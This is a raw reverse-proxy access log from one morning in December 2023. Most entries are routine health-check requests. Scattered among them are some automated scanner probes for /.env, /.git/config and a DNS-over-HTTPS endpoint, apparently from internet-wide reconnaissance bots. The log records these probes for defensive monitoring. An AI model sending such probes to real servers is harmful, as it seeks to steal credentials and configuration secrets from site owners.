47.74.90.127 - - [15/Dec/2023:09:25:28 +0000] "GET /dns-query?dns=4IMBAAABAAAAAAAABmdvb2dsZQNjb20AAAEAAQ HTTP/2.0" 404 19 "-" "-" 412 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 413 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 414 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 415 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 416 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 417 "www@docker" "http://172.28.0.10:80" 0ms
57.129.23.166 - - [15/Dec/2023:09:28:09 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 418 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:09:28:10 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 419 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 420 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 421 "www@docker" "http://172.28.0.10:80" 0ms
172.104.11.34 - - [15/Dec/2023:09:29:12 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 422 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 423 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 424 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 425 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 426 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 427 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 428 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 429 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 430 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 431 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 432 "www@docker" "http://172.28.0.10:80" 0ms
45.79.181.104 - - [15/Dec/2023:09:34:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 433 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 434 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 435 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 436 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 437 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 438 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 439 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 440 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 441 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 442 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 443 "www@docker" "http://172.28.0.10:80" 1ms
47.74.90.127 - - [15/Dec/2023:09:39:17 +0000] "POST /dns-query HTTP/2.0" 404 19 "-" "-" 444 "-" "-" 0ms
172.105.128.13 - - [15/Dec/2023:09:39:20 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 445 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 446 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 447 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 448 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 449 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 450 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 451 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 452 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 453 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 454 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:43:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 455 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 456 "www@docker" "http://172.28.0.10:80" 1ms
172.104.11.4 - - [15/Dec/2023:09:44:27 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 457 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:44:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 458 "www@docker" "http://172.28.0.10:80" 1ms
57.129.23.166 - - [15/Dec/2023:09:44:38 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 459 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:09:44:38 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 460 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:09:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 461 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:45:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 462 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 463 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:46:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 464 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 465 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:47:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 466 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 467 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:48:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 468 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 469 "www@docker" "http://172.28.0.10:80" 0ms
172.104.11.46 - - [15/Dec/2023:09:49:24 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 470 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:49:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 471 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 472 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:50:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 473 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 474 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:51:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 475 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:52:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 476 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:52:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 477 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:53:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 478 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:53:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 479 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:54:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 480 "www@docker" "http://172.28.0.10:80" 1ms
45.79.181.179 - - [15/Dec/2023:09:54:23 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 481 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:54:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 482 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:55:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 483 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:55:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 484 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:56:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 485 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:56:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 486 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:09:57:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 487 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:09:57:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 488 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:58:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 489 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:09:58:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 490 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:09:59:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 491 "www@docker" "http://172.28.0.10:80" 1ms
45.79.128.205 - - [15/Dec/2023:09:59:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 492 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:09:59:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 493 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:00:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 494 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:00:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 495 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:01:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 496 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:01:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 497 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:02:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 498 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:02:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 499 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:03:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 500 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:03:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 501 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:04:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 502 "www@docker" "http://172.28.0.10:80" 1ms
192.155.90.118 - - [15/Dec/2023:10:04:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 503 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:10:04:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 504 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:05:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 505 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:05:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 506 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 507 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:06:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 508 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 509 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:07:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 510 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 511 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:08:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 512 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 513 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:09:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 514 "www@docker" "http://172.28.0.10:80" 0ms
143.110.222.166 - - [15/Dec/2023:10:10:08 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 515 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 516 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:10:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 517 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 518 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:11:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 519 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 520 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:12:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 521 "www@docker" "http://172.28.0.10:80" 1ms
172.105.128.11 - - [15/Dec/2023:10:13:17 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 522 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 523 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:13:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 524 "www@docker" "http://172.28.0.10:80" 0ms
34.76.96.55 - - [15/Dec/2023:10:13:57 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 525 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 526 "www@docker" "http://172.28.0.10:80" 0ms
45.79.181.179 - - [15/Dec/2023:10:14:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 527 "-" "-" 0ms
167.71.120.76 - - [15/Dec/2023:10:14:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 528 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 529 "www@docker" "http://172.28.0.10:80" 1ms
54.37.79.75 - - [15/Dec/2023:10:15:33 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 530 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [15/Dec/2023:10:15:34 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 531 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:10:15:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 532 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 533 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:16:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 534 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 535 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:17:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 536 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 537 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:18:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 538 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 539 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:19:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 540 "www@docker" "http://172.28.0.10:80" 1ms
45.79.128.205 - - [15/Dec/2023:10:19:41 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 541 "-" "-" 0ms
34.140.130.61 - - [15/Dec/2023:10:20:14 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 542 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 543 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:20:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 544 "www@docker" "http://172.28.0.10:80" 0ms
202.142.155.254 - - [15/Dec/2023:10:20:50 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 545 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 546 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:21:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 547 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 548 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:22:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 549 "www@docker" "http://172.28.0.10:80" 1ms
143.110.222.166 - - [15/Dec/2023:10:23:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 550 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 551 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:23:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 552 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 553 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:24:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 554 "www@docker" "http://172.28.0.10:80" 1ms
45.33.80.243 - - [15/Dec/2023:10:24:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 555 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 556 "www@docker" "http://172.28.0.10:80" 2ms
167.71.120.76 - - [15/Dec/2023:10:25:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 557 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 558 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:26:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 559 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 560 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:27:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 561 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 562 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:28:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 563 "www@docker" "http://172.28.0.10:80" 1ms
54.152.1.55 - - [15/Dec/2023:10:29:13 +0000] "GET /.git/config HTTP/1.1" 301 17 "-" "-" 564 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 565 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:29:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 566 "www@docker" "http://172.28.0.10:80" 1ms
172.105.128.11 - - [15/Dec/2023:10:29:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 567 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 568 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:30:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 569 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:31:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 570 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:31:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 571 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 572 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:32:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 573 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 574 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:33:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 575 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 576 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:34:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 577 "www@docker" "http://172.28.0.10:80" 1ms
45.79.181.179 - - [15/Dec/2023:10:34:42 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 578 "-" "-" 0ms
172.105.128.13 - - [15/Dec/2023:10:35:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 579 "-" "-" 0ms
159.203.109.206 - - [15/Dec/2023:10:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 580 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:35:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 581 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 582 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:36:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 583 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 584 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:37:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 585 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 586 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:38:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 587 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 588 "www@docker" "http://172.28.0.10:80" 0ms
167.71.120.76 - - [15/Dec/2023:10:39:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 589 "www@docker" "http://172.28.0.10:80" 0ms
159.203.109.206 - - [15/Dec/2023:10:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 590 "www@docker" "http://172.28.0.10:80" 1ms
167.71.120.76 - - [15/Dec/2023:10:40:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 591 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 592 "www@docker" "http://172.28.0.10:80" 0ms
57.129.23.166 - - [15/Dec/2023:10:41:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 593 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [15/Dec/2023:10:41:34 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 594 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [15/Dec/2023:10:41:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 595 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:42:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 596 "www@docker" "http://172.28.0.10:80" 9ms
167.71.120.76 - - [15/Dec/2023:10:42:37 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 597 "www@docker" "http://172.28.0.10:80" 1ms
159.203.109.206 - - [15/Dec/2023:10:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 598 "www@docker" "http://172.28.0.10:80" 1ms
